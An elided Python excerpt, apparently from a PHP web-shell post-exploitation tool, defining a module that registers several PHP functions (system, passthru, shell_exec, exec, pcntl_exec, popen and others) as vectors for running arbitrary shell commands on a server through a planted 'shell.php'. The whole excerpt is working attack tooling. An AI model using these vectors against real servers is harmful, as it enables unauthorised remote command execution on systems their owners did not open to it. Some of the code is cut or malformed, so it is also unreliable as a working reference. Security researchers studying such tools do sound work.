...
class Sh(ModuleGuess):
    ...
    def _set_vectors(self):
        self.vectors.add_vector(
            "system", 'shell.php', "@system('$cmd $no_stderr');")
        self.vectors.add_vector(
            "passthru", 'shell.php', "@passthru('$cmd $no_stderr');")
        self.vectors.add_vector(
            "shell_exec", 'shell.php', "print(@shell_exec('$cmd $no_stderr'));")
        self.vectors.add_vector(
            "exec", 'shell.php',  "$r=array(); @exec('$cmd $no_stderr', $r);print(join(\"\\n\",$r));")
        self.vectors.add_vector(
            "pcntl", 'shell.php', '$p=@pcntl_fork(); if(!$p) { { @pcntl_exec( "/bin/sh", Array("-c", "$cmd")); } else { @pcntl_waitpid($p,$status); }}'),
        self.vectors.add_vector(
            "popen", 'shell.php', "$h = @popen('$cmd','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }")
        self.vectors.add_vector(
            "python_eval", 'shell.php', "@python_eval('import os; os.system('$cmd$no_stderr');');")
        self.vectors.add_vector(
            "perl_system", 'shell.php', "if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('$cmd$no_stderr'); print($r); }")
...
fclose($pipes[2]); proc_close($h); }""")
    ...
    def _set_args(self):
        ...
        self.argparser.add_argument(
            '-no-stderr', help='Suppress error output', action='store_false')
    ...
    def _prepare_vector(self):
        ...
        # Format cmd
        self.formatted_args['cmd'] = ' '.join(
            self.args['cmd']).replace("'", "\\'")
